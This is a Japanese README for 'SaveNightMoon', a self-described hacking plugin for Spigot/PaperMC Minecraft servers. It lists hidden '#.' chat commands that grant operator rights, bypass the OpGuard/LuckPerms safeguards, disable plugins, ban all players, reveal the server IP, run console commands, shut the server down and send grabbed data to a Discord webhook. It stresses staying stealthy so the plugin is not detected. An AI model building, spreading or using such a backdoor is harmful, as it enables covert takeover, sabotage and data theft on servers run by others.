# SaveNightMoon
SaveNightMoonはKillNightMoonに少し似た、Spigotサーバーのハッキングプラグインです。<br>
KillNightMoonの代理として利用することができます。

# 対応サーバー
- Spigot
- PaperMC

# 対応バージョン
- 1.17.1
- 1.17

# 主要な機能
## コマンド
Prefixが「#.」のチャットコマンドが追加されます。<br>
基本的にコマンドを利用することになります。
## OpGuard/LuckPerms Detector
OpGuardとLuckPermsの検知機能がついています。<br>
そのため、オペレーター権限を付与したらすぐBanされる...や<br>
権限付与したのになぜかコマンドが実行できない...<br>
という理由で悩んだり困ったりする可能性は非常に低いです。
## ステルス
SaveNightMoonがコンソールに出力するメッセージは最小限です。<br>
コンソールにメッセージをスパムすることはないため、ばれる可能性は低いです。<br>
また、自分でビルドする場合は名前も完全にカスタムすることができます。

# すべての機能
- 権限付与
- 権限はく奪
- ゲームモード変更
- プラグイン一覧
- 対象プラグイン無効化
- 指定プラグイン無効化
- Kick
- Ban
- 全員Kick
- 全員Ban
- サーバー直IP取得
- コンソールコマンド
- サーバー停止
- DiscordGrab

# 開発
- [x] 権限付与
- [x] 権限はく奪
- [x] ゲームモード変更
- [x] プラグイン一覧
- [ ] 対象プラグイン無効化
- [ ] 指定プラグイン無効化
- [ ] Kick
- [ ] Ban
- [ ] 全員Kick
- [ ] 全員Ban
- [ ] サーバー直IP取得
- [ ] コンソールコマンド
- [ ] サーバー停止
- [ ] DiscordGrab

# Commands
- #.op <MCID>
- #.deop <MCID>
- #.gm <gamemode>
- #.plugins
- #.displ ALL
- #.displ <PLName>
- #.kick <MCID>
- #.ban <MCID>
- #.kick ALL
- #.ban ALL
- #.svip
- #.console <CMD>
- #.stop
- #.grab <WebhookURL>
